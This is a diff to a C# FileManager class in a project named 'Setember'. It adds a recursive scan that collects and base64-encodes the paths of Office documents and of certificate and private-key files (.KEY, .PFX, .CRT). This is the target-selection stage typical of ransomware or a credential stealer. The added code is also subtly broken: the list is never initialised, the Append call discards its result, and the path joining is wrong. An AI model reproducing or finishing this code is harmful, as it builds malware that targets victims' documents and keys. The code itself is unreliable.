@@ -1,8 +1,13 @@
 using System.Collections.Generic;
+using System.IO;
+using System.Text;
 
 namespace Setember;
+
 public class FileManager
 {
+    public static List<string> FilesPath { get; private set; }
+
     private static readonly Dictionary<string, int> fileFormat = new Dictionary<string, int>()
     {
         {".DOC", 0 }, {".DOCX", 0 }, {".XLS", 0 }, {".XLSX", 0 }, {".PPT", 0 }, {".PPTX", 0 },
@@ -37,5 +42,20 @@ public class FileManager
         {".CRT", 0 }, {".KEY", 0 }, {".PFX", 0 }, {".DER", 0 }
     };
 
-
+    protected void GetFiles(string path)
+    {
+        foreach (string actualPath in Directory.GetDirectories(path, "*", SearchOption.AllDirectories))
+        {
+            string[] filesFound = Directory.GetFiles(actualPath);
+            foreach (string file in filesFound)
+            {
+                string extension = Path.GetExtension(file).ToUpper();
+                if (fileFormat.ContainsKey(extension) || extension == "")
+                {
+                    byte[] bytes = Encoding.UTF8.GetBytes(Path.Combine(actualPath, file));
+                    FilesPath.Append(Convert.ToBase64String(bytes));
+                }
+            }
+        }
+    }
 }
